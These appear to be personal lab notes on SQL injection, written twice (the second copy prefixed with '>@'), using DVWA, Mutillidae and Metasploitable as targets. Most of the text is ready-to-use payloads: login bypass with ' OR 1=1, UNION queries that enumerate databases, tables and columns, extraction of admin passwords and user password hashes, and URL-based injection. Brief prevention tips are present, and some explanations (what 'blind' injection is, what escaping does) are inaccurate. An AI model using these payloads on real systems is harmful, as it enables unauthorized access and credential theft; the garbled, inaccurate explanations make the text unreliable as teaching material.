SQL injection is used to directly inject code into the database using forms

Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input. 
To avoid SQL injection flaws, developers need to:

See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  
  -Stop writing dynamic queries with string concatenation or
  -Prevent malicious SQL input from being included in executed queries.

See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  

-> The little trix
If you just add a "'" into an email field (example "admin@vulneweb.com'") and see a "Query Error" message, that means that there is 
potentially a possibility to use SQL injection on that wensite.
Example of message "Query Error: Errror: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual ..."

-> Some examples of injection into forms

No need of password.
  Add (between []) [' OR 1=1; #] to obtain instant access to Admin page.

Obtain the number of columns.
  Add [' OR 1=1 order by x #] (with x=1,2,3, ... until a bad request (error). The max try  gives the number of columns.

Obtain the database version.
  Add [pwd' union select 1,version(),3,4,5; #]
  Add [' OR 1=1 union select 0,@@version,2 order by id; #]

Obtain name of database.
  Add [pwd' union select 1,database(),3,4,5; #]

Obtain name of all tables.
  Add [pwd' union select table_name,null from information_schema.tables; #]    !!! HEre, the null replace the second parameter.
    In this example, you have only two columns.
  Add [' OR 1=1 union select 0, group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() order by 1; #]

Obtain name of columns.
  Add [pwd' union select 1,2,3,4,5; #]
  Add [' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #]

Obtain username.
  Add [pwd' union select 1,user(),3,4,5; #]

Obtain the admin's password.
  Add [' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id; #]

-> Direct injection in the GET request.
  The GET request is less secured than the POST request. That's why, you could insert SQL requests directly into the URL.
  Example: 
  <meta IP>/mutillidae/index.php?page=user-info.php&username=admin&password=pwd' OR 1=1%23&user-info-php-submit-button=View+Account+Details
  Here, we see that the proposed password is "pwd' OR 1=1 #" because, we use URL encoding to transform "#" into interpretable character.
  More important, the SQL request is placed between "password=" and "%23". So, it is very easy to place requests here and test so many ones.
    password=[ Place your SQL request directly here ]%23&user-info-php-submit-button=View+Account+Details

-> Blind injection
  Sometime, the site gives no information if the SQL request is bad and only gives result if the request id good. That's why we speak about
    blind requests.
  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) then put the DVWA Security to low.
  Click on the "SQL Injection" menu and try [ pwd' OR 1=1 # ]
  Play with URL to find the number of column: http://ms/dvwa/vulnerabilities/sqli/?id=pwd' order by 2%23&Submit=Submit#
  Go to "SQL Injection (blind)" to  avoid having response except when the request is comprehensible by mySQL.
    Examples:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2,3 %23&Submit=Submit# is blind.
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2 %23&Submit=Submit# is blind.
  After, you can play with function().
    Example: <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select database(),version() %23&Submit=Submit# is blind.
  Retrieve the name of all tables:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select table_name,null from information_schema.tables 
      where table_schema='dvwa' %23&Submit=Submit#
    >>> you see a table named users.
  Retrieve the name of all columns of the table users:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select column_name,null from information_schema.columns where 
      table_schema='dvwa' %23&Submit=Submit#
    >>> you see a password column.
  Retrieve all passwords:
    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select password,null from users 
    >>> you see all passwords (hash MDA) for all users.
  Finally, search for theses hash to find clear password. The first one gives "password" :) !

-> Use escapment characters
  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) then put the DVWA Security to medium.
  If you try to inject data as above, the system gives now an error:
    http://ms/dvwa/vulnerabilities/sqli/?id=pwd' OR 1=1 %23&Submit=Submit#
  Return on the login page and click on "View soruce" then find that line:
    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
  >>> there is no " around the $id at the end. /!\ This could be a idea to find vulnerabilities.
xxxjoexxx
-> How to prevent SQL injection
  -Use real_escape_string() function in PHP.
    Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
  -Stop writing dynamic queries with string concatenation.
  -Prevent malicious SQL input from being included in executed queries.
  -Do not display SQL error to the client/user. Be blind !!

>@################################################################################################################################################
>@#                                                                                                                                              #
>@# [ SQL injection ]                                                                                                                            #
>@#                                                                                                                                              #
>@# SQL injection is used to directly inject code into the database using forms.                                                                 #
>@#                                                                                                                                              #
>@# Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input.  #
>@# To avoid SQL injection flaws, developers need to:                                                                                            #
>@#                                                                                                                                              #
>@#   -Stop writing dynamic queries with string concatenation.                                                                                   #
>@#   -Prevent malicious SQL input from being included in executed queries.                                                                      #
>@#                                                                                                                                              #
>@# See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html                                                #
>@# See: howto-0100-prevention-web-vulnerability.txt                                                                                             #
>@# See: howto-1075-owasp-top-10.txt                                                                                                             #
>@# See: howto-1076-owasp-top-10-fr.txt                                                                                                          #
>@#                                                                                                                                              #
>@#----------------------------------------------------------------------------------------------------------------------------------------------- 
>@
>@
>@-> The little trix
>@If you just add a "'" into an email field (example "admin@vulneweb.com'") and see a "Query Error" message, that means that there is 
>@potentially a possibility to use SQL injection on that wensite.
>@Example of message "Query Error: Errror: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual ..."
>@
>@-> Some examples of injection into forms
>@
>@No need of password.
>@  Add (between []) [' OR 1=1; #] to obtain instant access to Admin page.
>@
>@Obtain the number of columns.
>@  Add [' OR 1=1 order by x #] (with x=1,2,3, ... until a bad request (error). The max try  gives the number of columns.
>@
>@Obtain the database version.
>@  Add [pwd' union select 1,version(),3,4,5; #]
>@  Add [' OR 1=1 union select 0,@@version,2 order by id; #]
>@
>@Obtain name of database.
>@  Add [pwd' union select 1,database(),3,4,5; #]
>@
>@Obtain name of all tables.
>@  Add [pwd' union select table_name,null from information_schema.tables; #]    !!! HEre, the null replace the second parameter.
>@    In this example, you have only two columns.
>@  Add [' OR 1=1 union select 0, group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() order by 1; #]
>@
>@Obtain name of columns.
>@  Add [pwd' union select 1,2,3,4,5; #]
>@  Add [' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #]
>@
>@Obtain username.
>@  Add [pwd' union select 1,user(),3,4,5; #]
>@
>@Obtain the admin's password.
>@  Add [' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id; #]
>@
>@-> Direct injection in the GET request.
>@  The GET request is less secured than the POST request. That's why, you could insert SQL requests directly into the URL.
>@  Example: 
>@  <meta IP>/mutillidae/index.php?page=user-info.php&username=admin&password=pwd' OR 1=1%23&user-info-php-submit-button=View+Account+Details
>@  Here, we see that the proposed password is "pwd' OR 1=1 #" because, we use URL encoding to transform "#" into interpretable character.
>@  More important, the SQL request is placed between "password=" and "%23". So, it is very easy to place requests here and test so many ones.
>@    password=[ Place your SQL request directly here ]%23&user-info-php-submit-button=View+Account+Details
>@
>@-> Blind injection
>@  Sometime, the site gives no information if the SQL request is bad and only gives result if the request id good. That's why we speak about
>@    blind requests.
>@  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) then put the DVWA Security to low.
>@  Click on the "SQL Injection" menu and try [ pwd' OR 1=1 # ]
>@  Play with URL to find the number of column: http://ms/dvwa/vulnerabilities/sqli/?id=pwd' order by 2%23&Submit=Submit#
>@  Go to "SQL Injection (blind)" to  avoid having response except when the request is comprehensible by mySQL.
>@    Examples:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2,3 %23&Submit=Submit# is blind.
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select 1,2 %23&Submit=Submit# is blind.
>@  After, you can play with function().
>@    Example: <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select database(),version() %23&Submit=Submit# is blind.
>@  Retrieve the name of all tables:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select table_name,null from information_schema.tables 
>@      where table_schema='dvwa' %23&Submit=Submit#
>@    >>> you see a table named users.
>@  Retrieve the name of all columns of the table users:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select column_name,null from information_schema.columns where 
>@      table_schema='dvwa' %23&Submit=Submit#
>@    >>> you see a password column.
>@  Retrieve all passwords:
>@    <ms IP>/dvwa/vulnerabilities/sqli_blind/?id=pwd' union select password,null from users 
>@    >>> you see all passwords (hash MDA) for all users.
>@  Finally, search for theses hash to find clear password. The first one gives "password" :) !
>@
>@-> How to prevent SQL injection
>@  -Use real_escape_string() function in PHP.
>@    Example if the password is "pwd' OR 1=1 #", it becomes "pwd \' OR 1=1 \#', a simple string.
>@  -Stop writing dynamic queries with string concatenation.
>@  -Prevent malicious SQL input from being included in executed queries.
>@  -Do not display SQL error to the client/user. Be blind !!
>@
>@################################################################################################################################################
>@
